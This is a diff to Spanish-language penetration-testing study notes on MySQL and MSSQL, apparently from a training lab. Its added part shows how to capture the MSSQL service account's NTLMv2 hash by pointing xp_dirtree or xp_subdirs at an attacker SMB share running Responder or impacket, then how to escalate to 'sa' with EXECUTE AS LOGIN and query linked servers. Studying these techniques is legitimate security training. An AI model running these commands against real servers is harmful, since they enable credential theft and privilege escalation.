@@ -1,6 +1,6 @@
 > MySQL y Microsoft SQL Server (MSSQL) son sistemas de gestión de bases de datos relacionales que almacenan datos en tablas, columnas y filas. Muchos sistemas de bases de datos relacionales, como MSSQL y MySQL, utilizan el Lenguaje de Consulta Estructurado (SQL) para consultar y mantener la base de datos.
 
-Por defecto, **MSSQL** usa los puertos TCP/1434 y UDP/1434, mientras que **MySQL** usa el puerto TCP/3306. Sin embargo, vuando MSSQL usa el modo oculto, utiliza el puerto TCP/2433.
+Por defecto, **MSSQL** usa los puertos TCP/1433 y UDP/1434, mientras que **MySQL** usa el puerto TCP/3306. Sin embargo, vuando MSSQL usa el modo oculto, utiliza el puerto TCP/2433.
 ### Conectando al servidor SQL
 ##### MySQL
 
@@ -61,6 +61,8 @@ Si usamos `sqlcmd` tendremos que escribir `GO` después de nuestra query para ej
 1> SELECT name FROM master.dbo.sysdatabases
 2> GO
 ```
+
+> En algunas versiones no es con mayúsculas, sino `go`.
 
 ##### Mostrar tablas con sqlcmd
 
@@ -190,3 +192,141 @@ En la sección sobre ataques a **SMB**, mencionamos que se puede crear un servid
 De manera similar, también es posible **robar el hash de la cuenta de servicio de MSSQL** utilizando los procedimientos almacenados no documentados **xp_subdirs** o **xp_dirtree**. Estos procedimientos utilizan el protocolo SMB para obtener una lista de subdirectorios dentro de un directorio padre especificado del sistema de archivos.
 
 Cuando usamos uno de estos procedimientos y lo apuntamos a nuestro servidor SMB falso, la funcionalidad de lectura de directorios forzará al servidor SQL a **autenticarse** con el servidor SMB, enviando así el **hash NTLMv2 de la cuenta de servicio** que está ejecutando el servidor SQL. Para que esto funcione, necesitamos primero lanzar `Responder` o `impacket-smbserver` y ejecutar los siguientes comandos
+
+##### XP_DIRTREE - Robo del hash
+
+```cmd-session
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
+```
+
+##### XP_SUBDIRS - Robo del hash
+
+```cmd-session
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+```
+
+Si la cuenta de servicio tiene acceso a nuestro servidor de impacket, obtendremos su hash. Podemos entonces intentar adivinar el hash o dejárselo a otro host.
+
+##### XP_SUBDIRS - Robo del hash con Responder
+
+```shell-session
+amr251@htb[/htb]$ sudo responder -I tun0
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+<SNIP>
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:...
+```
+
+##### XP_SUBDIRS - Robo del hash con impacket
+
+```shell-session
+amr251@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+```
+
+### Suplantación de usuarios existentes en MSSQL
+
+SQL Server tiene un permiso especial llamado **IMPERSONATE**, que permite al usuario que lo ejecuta asumir los permisos de otro usuario o inicio de sesión hasta que se restablezca el contexto o finalice la sesión. Este permiso puede ser aprovechado para llevar a cabo una **escalada de privilegios** en el servidor SQL.
+
+Primero, necesitamos identificar qué usuarios podemos suplantar.
+
+- **Los sysadmins** pueden suplantar a cualquier usuario por defecto.    
+- **Los usuarios no administradores** solo pueden suplantar si se les ha asignado explícitamente el privilegio.    
+
+Podemos utilizar la siguiente consulta para identificar a los usuarios que podemos suplantar:
+
+```cmd-session
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+name
+-----------------------------------------------
+sa
+ben
+valentin
+```
+
+##### Verificar nuestro usuarios y rol actuales
+
+```cmd-session
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+-----------
+julio                                                                                                                    
+
+(1 rows affected)
+
+-----------
+          0
+
+(1 rows affected)
+```
+
+Como el valor `0` indica, no tenemos el rol de sysadmin, pero podemos suplantar el usuario `sa`. Para suplantarlo, podemos usar el stmnt Transact-SQL `EXECUTE AS LOGIN` y establecerlo al usuario que queremos suplantar
+
+```cmd-session
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+-----------
+sa
+
+(1 rows affected)
+
+-----------
+          1
+
+(1 rows affected)
+```
+
+Si encontramos un usuario que no es sysadmin, podemos aun así comprobar si el usuario tiene acceso a otras BDD o servidores enlazados
+
+##### Identificar servidores enlazados en MSSQL
+
+```cmd-session
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+
+(2 rows affected)
+```
+
+Como podemos ver en la salida de la consulta, aparece el **nombre del servidor** y la columna **isremote**, donde:
+
+- **1** indica que es un **servidor remoto**.    
+- **0** indica que es un **servidor vinculado** (linked server).    
+
+Para más información, podemos consultar la documentación de **sysservers** en Transact-SQL. A continuación, podemos intentar identificar el **usuario utilizado en la conexión** y sus privilegios. Para ello, se puede usar la instrucción **EXECUTE**, que permite enviar comandos directamente a los **servidores vinculados (linked servers)**.
+
+```cmd-session
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+
+------------------------------ ------------------------------ ------------------------------ -----------
+DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
+
+(1 rows affected)
+```
+
